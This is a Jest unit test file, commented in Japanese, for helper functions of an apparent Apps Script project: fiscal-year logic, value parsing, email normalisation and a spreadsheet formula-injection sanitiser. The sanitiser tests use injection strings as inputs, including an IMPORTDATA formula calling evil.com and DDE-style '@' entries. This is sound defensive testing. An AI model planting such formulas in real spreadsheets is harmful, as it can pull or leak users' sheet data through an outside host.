/**
 * ビジネスロジック 単体テスト
 * 対象: コード.js のピュア関数（GAS API 非依存）
 */

'use strict';

const {
  getFiscalYear,
  parseNullablePositiveInteger,
  normalizeEmail,
  parseBoolean,
  sanitizeForSheet,
  parsePositiveIntegerOrDefault,
} = require('./src/pure-functions');

// ============================================================
// getFiscalYear — 年度計算（4月始まり）
// ============================================================
describe('getFiscalYear', () => {
  test('4月は同年度の開始', () => {
    expect(getFiscalYear(new Date('2025-04-01'))).toBe(2025);
    expect(getFiscalYear(new Date('2026-04-01'))).toBe(2026);
  });

  test('3月は前年度の末', () => {
    expect(getFiscalYear(new Date('2026-03-31'))).toBe(2025);
    expect(getFiscalYear(new Date('2025-03-01'))).toBe(2024);
  });

  test('年度境界: 3月末 → 4月始め', () => {
    expect(getFiscalYear(new Date('2026-03-31'))).toBe(2025);
    expect(getFiscalYear(new Date('2026-04-01'))).toBe(2026);
  });

  test('1月・2月は前年度', () => {
    expect(getFiscalYear(new Date('2026-01-01'))).toBe(2025);
    expect(getFiscalYear(new Date('2026-02-28'))).toBe(2025);
  });

  test('12月は同年度', () => {
    expect(getFiscalYear(new Date('2025-12-31'))).toBe(2025);
  });

  test('文字列形式の日付も受け付ける', () => {
    expect(getFiscalYear('2025-04-01T00:00:00')).toBe(2025);
  });

  test('パース不能な文字列は 0 を返す', () => {
    expect(getFiscalYear('invalid')).toBe(0);
    expect(getFiscalYear('not-a-date')).toBe(0);
  });

  test('null は new Date(null) = エポック(1970/1) として扱われ FY1969 を返す', () => {
    // new Date(null) は epoch(0) = 1970-01-01 → 1月は < 3 → FY = 1969
    expect(getFiscalYear(null)).toBe(1969);
  });
});

// ============================================================
// parseNullablePositiveInteger — 上限特例値のパース
// ============================================================
describe('parseNullablePositiveInteger', () => {
  test('正の整数を返す', () => {
    expect(parseNullablePositiveInteger(3)).toBe(3);
    expect(parseNullablePositiveInteger('5')).toBe(5);
    expect(parseNullablePositiveInteger(10)).toBe(10);
  });

  test('小数は切り捨て', () => {
    expect(parseNullablePositiveInteger(3.9)).toBe(3);
    expect(parseNullablePositiveInteger('2.7')).toBe(2);
  });

  test('null / undefined / 空文字は null を返す（全体設定に戻す）', () => {
    expect(parseNullablePositiveInteger(null)).toBeNull();
    expect(parseNullablePositiveInteger(undefined)).toBeNull();
    expect(parseNullablePositiveInteger('')).toBeNull();
    expect(parseNullablePositiveInteger('  ')).toBeNull();
  });

  test('0 以下はエラー', () => {
    expect(() => parseNullablePositiveInteger(0)).toThrow();
    expect(() => parseNullablePositiveInteger(-1)).toThrow();
  });

  test('非数値はエラー', () => {
    expect(() => parseNullablePositiveInteger('abc')).toThrow();
    expect(() => parseNullablePositiveInteger(Infinity)).toThrow();
  });
});

// ============================================================
// normalizeEmail — メール正規化
// ============================================================
describe('normalizeEmail', () => {
  test('小文字に変換する', () => {
    expect(normalizeEmail('User@Example.COM')).toBe('user@example.com');
  });

  test('前後の空白をトリム', () => {
    expect(normalizeEmail('  test@example.jp  ')).toBe('test@example.jp');
  });

  test('null / undefined は空文字', () => {
    expect(normalizeEmail(null)).toBe('');
    expect(normalizeEmail(undefined)).toBe('');
  });

  test('既に正規化されたメールはそのまま', () => {
    expect(normalizeEmail('test@tadakayo.jp')).toBe('test@tadakayo.jp');
  });
});

// ============================================================
// parseBoolean — 設定値のブール変換
// ============================================================
describe('parseBoolean', () => {
  test('true/false はそのまま', () => {
    expect(parseBoolean(true, false)).toBe(true);
    expect(parseBoolean(false, true)).toBe(false);
  });

  test('"true" / "1" / "yes" / "on" は true', () => {
    expect(parseBoolean('true',  false)).toBe(true);
    expect(parseBoolean('1',     false)).toBe(true);
    expect(parseBoolean('yes',   false)).toBe(true);
    expect(parseBoolean('on',    false)).toBe(true);
  });

  test('"false" / "0" / "no" / "off" は false', () => {
    expect(parseBoolean('false', true)).toBe(false);
    expect(parseBoolean('0',     true)).toBe(false);
    expect(parseBoolean('no',    true)).toBe(false);
    expect(parseBoolean('off',   true)).toBe(false);
  });

  test('大文字小文字を区別しない', () => {
    expect(parseBoolean('TRUE',  false)).toBe(true);
    expect(parseBoolean('FALSE', true)).toBe(false);
  });

  test('空文字/null はデフォルト値を返す', () => {
    expect(parseBoolean('',   true)).toBe(true);
    expect(parseBoolean(null, false)).toBe(false);
  });
});

// ============================================================
// sanitizeForSheet — スプレッドシート数式インジェクション防止
// OWASP A03:2025 準拠
// ============================================================
describe('sanitizeForSheet — 数式インジェクション防止 (OWASP A03:2025)', () => {
  test('= で始まる文字列にアポストロフィを付与', () => {
    expect(sanitizeForSheet('=SUM(A1)')).toBe("'=SUM(A1)");
    expect(sanitizeForSheet('=IMPORTDATA("http://evil.com")')).toBe("'=IMPORTDATA(\"http://evil.com\")");
  });

  test('+ で始まる文字列を無害化', () => {
    expect(sanitizeForSheet('+1234')).toBe("'+1234");
  });

  test('- で始まる文字列を無害化', () => {
    expect(sanitizeForSheet('-1234')).toBe("'-1234");
  });

  test('@ で始まる文字列を無害化（DDE攻撃）', () => {
    expect(sanitizeForSheet('@SUM(1+1)')).toBe("'@SUM(1+1)");
  });

  test('タブ / CR で始まる文字列を無害化', () => {
    expect(sanitizeForSheet('\t=inject')).toBe("'\t=inject");
    expect(sanitizeForSheet('\r=inject')).toBe("'\r=inject");
  });

  test('通常の文字列はそのまま', () => {
    expect(sanitizeForSheet('やまだ訪問介護ステーション')).toBe('やまだ訪問介護ステーション');
    expect(sanitizeForSheet('test@example.com')).toBe('test@example.com');
    expect(sanitizeForSheet('山田一郎')).toBe('山田一郎');
  });

  test('空文字はそのまま', () => {
    expect(sanitizeForSheet('')).toBe('');
  });

  test('非文字列はそのまま返す', () => {
    expect(sanitizeForSheet(null)).toBeNull();
    expect(sanitizeForSheet(undefined)).toBeUndefined();
    expect(sanitizeForSheet(123)).toBe(123);
    expect(sanitizeForSheet(true)).toBe(true);
  });

  test('= 始まりでも通常のテキスト（メール等）は影響を受けない（@ は途中なら正常）', () => {
    // メールは @ が先頭に来ない
    expect(sanitizeForSheet('user@example.com')).toBe('user@example.com');
  });
});

// ============================================================
// parsePositiveIntegerOrDefault — 設定値のパース
// ============================================================
describe('parsePositiveIntegerOrDefault', () => {
  test('正の整数を返す', () => {
    expect(parsePositiveIntegerOrDefault('10', 10)).toBe(10);
    expect(parsePositiveIntegerOrDefault('3', 3)).toBe(3);
    expect(parsePositiveIntegerOrDefault(5, 3)).toBe(5);
  });

  test('無効な値はデフォルトを返す', () => {
    expect(parsePositiveIntegerOrDefault('', 10)).toBe(10);
    expect(parsePositiveIntegerOrDefault('abc', 10)).toBe(10);
    expect(parsePositiveIntegerOrDefault('-5', 10)).toBe(10);
    expect(parsePositiveIntegerOrDefault('0', 10)).toBe(10);
  });

  test('小数は切り捨て', () => {
    expect(parsePositiveIntegerOrDefault('3.9', 10)).toBe(3);
  });
});
